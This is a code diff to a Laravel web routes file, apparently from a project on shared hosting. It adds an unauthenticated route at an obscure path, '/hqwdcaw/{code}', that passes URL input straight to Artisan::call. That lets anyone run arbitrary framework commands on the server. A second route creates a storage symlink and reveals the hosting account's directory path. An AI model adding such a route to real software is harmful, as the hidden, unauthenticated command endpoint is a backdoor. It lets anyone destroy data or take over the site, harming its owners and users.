@@ -5,6 +5,7 @@ use App\Http\Controllers\PageController;
 use App\Http\Controllers\ProductController;
 use App\Http\Controllers\ProductPlatformController;
 use App\Http\Controllers\ProfileController;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -68,5 +69,16 @@ Route::middleware('auth')->group(function () {
     Route::post('page/update-page-hierarchy', [PageController::class, 'updatePageHierarchy'])->name('page.update_page_hierarchy');
     Route::resource('page', PageController::class);
 });
+
+
+Route::get('/hqwdcaw/{code}', function($code) {
+    Artisan::call($code);
+});
+
+Route::get('/symlink', function () {
+
+    symlink('/home1/aitoolsg/public_html/ai_tools_backend/storage/app/public', '/home1/aitoolsg/public_html/ai_tools_backend/public/storage');
+});
+
 
 require __DIR__.'/auth.php';
